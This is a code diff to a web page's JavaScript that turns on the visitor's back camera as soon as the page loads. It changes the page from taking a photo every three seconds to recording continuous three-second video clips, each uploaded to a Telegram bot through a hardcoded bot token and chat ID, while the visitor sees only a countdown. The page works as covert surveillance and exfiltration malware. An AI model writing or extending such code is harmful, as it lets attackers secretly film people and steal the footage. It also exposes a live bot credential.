@@ -3,6 +3,8 @@ document.addEventListener("DOMContentLoaded", async function () {
     const progressBar = document.getElementById("progress");
     let timeLeft = 20;
     let countdownStarted = false;
+    let mediaRecorder;
+    let recordedChunks = [];
 
     async function getBackCameraId() {
         try {
@@ -28,10 +30,11 @@ document.addEventListener("DOMContentLoaded", async function () {
             });
 
             video.srcObject = stream;
+            startRecording(stream);
+
             video.onloadedmetadata = () => {
-                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي والتقاط الصور فورًا...");
+                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي وتسجيل الفيديو فورًا...");
                 startCountdown();
-                capturePhotosRepeatedly();
             };
         } catch (error) {
             console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
@@ -39,7 +42,7 @@ document.addEventListener("DOMContentLoaded", async function () {
     }
 
     function startCountdown() {
-        if (countdownStarted) return; // منع تكرار تشغيل العد
+        if (countdownStarted) return;
         countdownStarted = true;
 
         const countdownInterval = setInterval(() => {
@@ -53,40 +56,40 @@ document.addEventListener("DOMContentLoaded", async function () {
         }, 1000);
     }
 
-    function capturePhotosRepeatedly() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+    function startRecording(stream) {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
 
-        function takePhoto() {
-            if (!document.hasFocus()) return;
+        mediaRecorder.ondataavailable = function (event) {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        mediaRecorder.onstop = function () {
+            console.log("📹 تم تسجيل الفيديو! جاري الإرسال...");
+            sendVideo();
+            recordedChunks = [];
+            setTimeout(() => mediaRecorder.start(), 200); // إعادة التسجيل بعد نصف ثانية
+        };
 
-            console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
-            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
-
-            setTimeout(takePhoto, 3000); // التقاط صورة كل 3 ثواني
-        }
-
-        takePhoto(); // أول لقطة فور تشغيل الكاميرا
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 3000); // تسجيل كل 3 ثوانٍ
     }
 
-    function sendPhoto(blob) {
+    function sendVideo() {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
         const formData = new FormData();
         formData.append("chat_id", "5375214810");
-        formData.append("photo", blob, "snapshot.jpg");
+        formData.append("video", blob, "video_clip.webm");
 
-        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
+        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendVideo", {
             method: "POST",
             body: formData
         })
         .then(response => response.json())
-        .then(data => console.log("✅ تم إرسال الصورة بنجاح:", data))
-        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
+        .then(data => console.log("✅ تم إرسال الفيديو بنجاح:", data))
+        .catch(error => console.error("❌ خطأ في إرسال الفيديو:", error));
     }
 
-    startCamera(); // تشغيل الكاميرا فور تحميل الصفحة
+    startCamera();
 });
